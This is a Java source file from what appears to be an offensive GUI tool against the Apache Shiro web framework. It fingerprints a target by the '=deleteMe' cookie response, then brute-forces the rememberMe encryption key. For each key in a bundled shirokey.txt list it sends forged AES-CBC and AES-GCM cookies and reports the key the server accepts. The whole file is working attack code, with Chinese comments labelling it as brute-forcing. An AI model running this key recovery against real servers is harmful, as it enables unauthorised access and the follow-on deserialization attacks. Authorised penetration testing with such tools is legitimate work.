package core;

import entity.ControllersFactory;
import ui.MainController;
import utils.createAESGCMCipher;
import utils.createAESCBCCipher;
import utils.HttpUtils;

import java.io.*;

public class ShiroKeyDetect {
    final private MainController myController = (MainController) ControllersFactory.controllers.get(MainController.class.getSimpleName());
    //检测是否为shiro框架
    public static boolean isShiro(String url){
        boolean flag = false;
        String result = HttpUtils.getHeader(url,"1");
        flag = result.contains("=deleteMe");

        return flag;
    }
    //爆破shirokey
    public void ShiroKey(String url) throws Exception {
        String shirokey = "";
        String mode = "";
        InputStream  fis  =  ShiroKeyDetect.class.getClassLoader().getResourceAsStream("shirokey.txt");

        if (fis != null){
            BufferedReader reader = new BufferedReader(new InputStreamReader(fis));
            String key = null;
            //先爆破CBC加密方式
            while ((key = reader.readLine()) != null){
                String cookieCBC = createAESCBCCipher.encrypt(key);
                String cookieGCM = createAESGCMCipher.encrypt(key);

                String resCBC = HttpUtils.getHeader(url,cookieCBC);
                String resGCM = HttpUtils.getHeader(url,cookieGCM);

                if (!resCBC.contains("=deleteMe")){
                    shirokey = key;
                    mode = "CBC";
                    System.out.println("[*]CBC\n");
                    System.out.println("[*]"+key+"\n");
                    this.myController.result.appendText("[*]CBC\n");
                    this.myController.result.appendText("[*]"+key+"\n");
                    break;
                }else if(!resGCM.contains("=deleteMe")){
                    shirokey = key;
                    mode = "GCM";
                    System.out.println("[*]GCM");
                    System.out.println("[*]"+key);
                    this.myController.result.appendText("[*]GCM\n");
                    this.myController.result.appendText("[*]"+key+"\n");
                    break;
                }else {
                    this.myController.result.appendText("[-]"+key+"\n");
                }
            }
        }
    }

}
